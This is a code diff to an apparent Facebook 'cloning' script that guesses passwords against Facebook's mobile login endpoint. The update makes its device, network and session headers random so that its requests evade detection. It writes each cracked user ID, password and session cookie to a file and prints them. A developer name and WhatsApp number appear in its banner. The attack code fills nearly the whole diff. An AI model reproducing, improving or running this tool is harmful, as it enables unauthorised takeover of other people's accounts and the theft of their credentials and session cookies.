@@ -283,7 +283,7 @@ logo = f"""
 \x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mDEVELOPER   \x1b[38;5;46m▶  \033[1;97mMohammad MAAZ
 \x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mWHATSAPP    \x1b[38;5;46m▶  \033[1;97m+923079741690
 \x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mFEATURE     \x1b[38;5;46m▶  \033[1;97mOLD FACEBOOK CLONE
-\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mVERSION     \x1b[38;5;46m▶  \033[1;97mv3.3 PREMIUM
+\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mVERSION     \x1b[38;5;46m▶  \033[1;97mv3.4 PREMIUM
 \x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSTATUS      \x1b[38;5;46m▶  \033[1;97mFULLY WORKING ✓
 \x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
 
@@ -426,33 +426,43 @@ def login1(uid):
             head = {'User-Agent': ua,
             'Content-Type': 'application/x-www-form-urlencoded', 
             'Host': 'graph.facebook.com', 
-            'X-FB-Net-HNI': '25227',
-            'X-FB-SIM-HNI': '29752',
-            'X-FB-Connection-Type': 'MOBILE.LTE', 
+            'X-FB-Net-HNI': str(random.choice([45201, 45206, 45404, 45205, 45403, 45204, 45207])),
+            'X-FB-SIM-HNI': str(random.choice([45201, 45206, 45404, 45205, 45403, 45204])),
+            'X-FB-Connection-Type': random.choice(['MOBILE.LTE', 'WIFI', 'MOBILE.EDGE', '4G']),
             'X-Tigon-Is-Retry': 'False', 
-            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
-            'x-fb-device-group': '5120', 
-            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
+            'x-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid={random.randint(130,140)};nc=1;fc=0;bc=0;cid={str(uuid.uuid4())[:32]}', 
+            'x-fb-device-group': str(random.choice([5120, 5121, 5122, 5123, 5124])),
+            'X-FB-Friendly-Name': random.choice(['ViewerReactionsMutation', 'authenticate', 'AuthenticateUser']),
             'X-FB-Request-Analytics-Tags': 'graphservice', 
             'X-FB-HTTP-Engine': 'Liger', 
             'X-FB-Client-IP': 'True', 
             'X-FB-Server-Cluster': 'True', 
-            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
-            'Content-Length': '706'}
+            'x-fb-connection-token': str(uuid.uuid4())[:32],
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept': '*/*',
+            'Connection': 'keep-alive',
+            'X-FB-Client-Name': 'FBAndroidSDK',
+            'X-FB-Client-Version': random.choice(['15.0.0', '14.2.0', '16.1.0', '15.2.1']),
+            'Authorization': f'OAuth {data["access_token"]}',
+            'X-FB-API-Version': 'v15.0',
+            'X-FB-Background-State': '1',
+            'X-FB-Request-Type': 'api',
+            'Priority': 'u=3, i',
+            'Content-Length': str(len('&'.join([f'{k}={v}' for k, v in data.items()])))}
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:
                 cookies = ";".join([f"{i['name']}={i['value']}" for i in rp.get('session_cookies', [])])
                 oks.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
+                print(f'\n{uid}|{pw}|{cookies}')
                 break
 
             elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
                 cookies = ";".join([f"{i.get('name')}={i.get('value')}" for i in rp.get('session_cookies', [])]) if "session_cookies" in rp else "NO-COOKIE"
                 cps.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
-                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
+                print(f'\n{uid}|{pw}|{cookies}')
                 break
 
             else:
